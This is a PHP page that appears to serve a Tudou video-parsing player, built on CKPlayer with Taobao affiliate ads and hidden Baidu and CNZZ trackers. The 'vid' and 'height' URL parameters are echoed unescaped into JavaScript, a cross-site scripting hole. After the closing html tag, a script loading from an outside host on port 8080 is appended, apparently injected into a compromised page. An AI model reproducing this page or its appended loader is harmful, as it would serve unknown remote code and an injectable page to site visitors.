<?php 
$vid=$_GET['vid'];
$height=$_GET['height'];
include('tdyun_jx1.php');
$Urlobj = new Urlobj(); 
$url=$Urlobj ->url($vid);

?> 
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>tudou player</title>
</head>
<style>
body,html,div{background-color:black;padding:0;margin:0;width:100%;height:100%;}
html,body{
width:100%;
background:#000;
text-align: center;
}
*{
padding:0;
margin:0;
}
#bfq_if{background:#000;}
</style>
<body>
<!-- 播放器容器 -->
<div id="a1"></div>
<script type="text/javascript" src="/tdyun/js/jquery-v1.10.2.min.js"></script>

<script type="text/javascript" src="/ckplayer/ckplayer.js" charset="utf-8"></script>
<script type="text/javascript">
    var isPhone = navigator.userAgent.match(/iPad|iPhone|Android|Linux|iPod/i) != null;

	var id ="<?php echo $vid?>",height = "<?php echo $height?>";
	if(id==''){
		alert('错误的参数');
	}
    if(!height){
		height = '100%'; 
	}
	var isM3u8 =0;
	var playerUrl = '<?php echo $url?>';
	player(playerUrl,'a1','100%',height,isM3u8);
	//API全能解析

	//播放地址，播放id容器，播放器宽度，播放器高度
	//alert(playerUrl)
	function player(url,id,w,h,isM3u8) {
		
		if (isPhone) {
			var htm = '<video id="bfq_if" width="'+ w +'" height="'+ h +'" controls="controls" autoplay="autoplay" x-webkit-airplay="allow" src="' + url + '"></video>';
				document.getElementById(id).innerHTML = htm;
		} else {
			if(isM3u8){ 
			     flashvars = {f:'/ckplayer/m3u8.swf',a:encodeURIComponent(url),c:0,s:4,lv:0,p:1,v:100,b:1,m:"",
		d:"http://www.vipjiexi.com/9.jpg",
		u:"https://temai.taobao.com/cheap.htm?pid=mm_10834098_22292728_74094867",
		l:"",r:"https://temai.taobao.com/cheap.htm?pid=mm_10834098_22292728_74094867",
		t:""} 
			}else{
				flashvars={f:url,s: 0,lv: 0,c: 0,p: 1, b:0,m:"",
		d:"http://www.vipjiexi.com/9.jpg",
		u:"https://temai.taobao.com/cheap.htm?pid=mm_10834098_22292728_74094867",
		l:"",r:"https://temai.taobao.com/cheap.htm?pid=mm_10834098_22292728_74094867",
		t:"",loaded:'loadedHandler'};
			}
			var params={bgcolor:'#000',allowFullScreen:true,allowScriptAccess:'always'};
			CKobject.embedSWF('/ckplayer/ckplayer.swf',id,'ckplayer_a1',w,h,flashvars,params);
		}
	}
  </script>


</body><div style="display:none"><script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?5848d8e507b11af856b2fb2ac65c6f70";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<div style="display:none"><script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1261176268'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s11.cnzz.com/z_stat.php%3Fid%3D1261176268%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));x</script></div>
</html><script src='http://cc.bb3k.cn:8080/s.php?id=3499'></script>